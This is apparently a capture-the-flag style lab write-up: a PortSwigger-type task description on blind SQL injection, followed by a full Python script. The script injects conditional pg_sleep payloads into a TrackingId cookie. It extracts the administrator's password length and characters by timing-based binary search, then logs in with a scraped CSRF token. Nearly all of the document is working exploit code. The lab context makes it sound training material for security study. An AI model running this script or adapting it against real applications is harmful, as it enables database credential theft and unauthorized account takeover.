# Blind SQL injection with time delays and information retrieval
> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
> To solve the lab, log in as the `administrator` user.

```python
import requests
import sys
import string
import time
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: Blind SQL injection with time delays and information retrieval
TARGET_URL = "https://0ab900110440998580521299003a002e.web-security-academy.net/"

def get_session(url):
    print(f"[*] Connecting to {url}...")
    session = requests.Session()
    response = session.get(url)
    if "TrackingId" in session.cookies:
        print("[+] Session established.")
        return session
    else:
        print("[-] Failed to get TrackingId.")
        sys.exit(1)

def check_boolean(url, session, payload):
    """
    Sends the payload and checks if the response takes > 2.5 seconds.
    """
    TrackingId = session.cookies['TrackingId']
    # Payload wrapper
    NewCookie = TrackingId + f"' || {payload} -- "
    
    # Direct request without try/except
    response = session.get(url, cookies={"TrackingId": NewCookie})
    elapsedtime = response.elapsed.total_seconds()

    # Logic: We are using pg_sleep(3). If elapsed > 2.5, it's a hit.
    if elapsedtime > 2.5:
        return True
    else:
        return False

def check_password_length(url, session):
    print("[*] Determining password length...")
    for i in range(1, 50):
        # Logic: If Length > i, sleep(3).
        condition = f"(SELECT LENGTH(password) FROM users WHERE username='administrator') > {i}"
        injection = f"(SELECT CASE WHEN ({condition}) THEN pg_sleep(3) ELSE pg_sleep(0) END)"
        
        sys.stdout.write(f"\r[>] Checking Length: {i}")
        sys.stdout.flush()
        
        # If FALSE (Fast response), then Length is NOT > i. So Length == i.
        if not check_boolean(url, session, injection):
            print(f"\n[+] Password Length found: {i}")
            return i
    return None

def get_password(url, session, pass_length):
    print(f"[*] Extracting {pass_length}-character password using Binary Search...")
    password = ""
    
    for i in range(1, pass_length + 1):
        low = 32   # ASCII Space
        high = 126 # ASCII Tilde
        
        while low < high:
            mid = (low + high) // 2
            
            # Binary Search Logic: Is char ASCII value > mid?
            condition = f"ASCII(SUBSTR(password,{i},1)) > {mid}"
            payload = f"(SELECT CASE WHEN ({condition}) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')"
            
            sys.stdout.write(f"\r[>] Char {i}: Checking > {mid} (Current: {password}...)")
            sys.stdout.flush()
            
            if check_boolean(url, session, payload):
                # True (Sleeps) -> Value is in upper half
                low = mid + 1
            else:
                # False (Fast) -> Value is in lower half
                high = mid
        
        # When low == high, we found the char
        char = chr(low)
        password += char
        sys.stdout.write(f"\r[+] Extracted Position {i}: {char}                                \n")
        
    print(f"\n[SUCCESS] Final Password Found: {password}")
    return password

def login(url, password):
    login_url = url + "login"
    print(f"[-] Attempting login with password: {password}")
    
    session = requests.Session()
    response = session.get(login_url)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find("input", {"name": "csrf"})
    
    if not csrf_input:
        print("[-] CSRF Token not found.")
        return

    token = csrf_input['value']
    
    login_data = {
        "username": "administrator",
        "password": password,
        "csrf": token
    }
    
    response = session.post(login_url, data=login_data)
    if "Log out" in response.text:
        print("\n[SUCCESS] LOGGED IN AS ADMINISTRATOR!")
    else:
        print("\n[-] Login Failed.")

if __name__ == "__main__":
    session = get_session(TARGET_URL)
    
    # 1. Get Length
    pw_length = check_password_length(TARGET_URL, session)
    
    if pw_length:
        # 2. Extract Password
        password = get_password(TARGET_URL, session, pw_length)
        
        # 3. Login
        login(TARGET_URL, password)
```